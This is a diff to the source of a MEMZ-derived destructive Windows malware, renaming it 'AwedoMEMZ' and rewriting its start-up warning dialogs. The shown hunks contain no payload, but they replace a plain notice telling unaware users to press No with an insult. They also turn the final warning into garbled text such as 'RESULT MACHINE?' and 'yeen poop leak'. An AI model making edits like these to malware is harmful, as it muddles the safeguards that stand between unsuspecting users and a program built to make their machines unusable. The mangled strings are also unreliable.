@@ -1,10 +1,10 @@
 /*
-    VineMEMZ
+    AwedoMEMZ
     
     Warning: The code was written in about a week and I did not took affort in making it efficient
 	         and well organised.
 
-             It was originally written for Vinesauce Joel's Windows 10 Destruction.
+             It was originally written for Awedosauce Koe's Doors 12 Destruction.
              It needs a lot of assets to run.
 */
 
@@ -116,13 +116,13 @@ void main() {
 		} else {
 			if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
 This malware will harm your computer and makes it unusable.\r\n\
-If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
-If you know what this malware does and are using a safe environment to test, \
+If you are seeing this message and you're stupid, simply press No and nothing will happen.\r\n\
+If you're smart and are using a safe environment to test, \
 press Yes to start it.\r\n\r\n\
-DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "VineMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
-MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
-THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
-STILL EXECUTE IT?", "VineMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
+DO YOU WANT EXECUTE THIS MALWARE, RESULT MACHINE?", "AwedoMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
+MessageBoxA(NULL, "This last warn!\r\n\r\n\
+yeen poop leak IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
+STILL EXECUTE IT?", "AwedoMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 				ExitProcess(0);
 			}
 
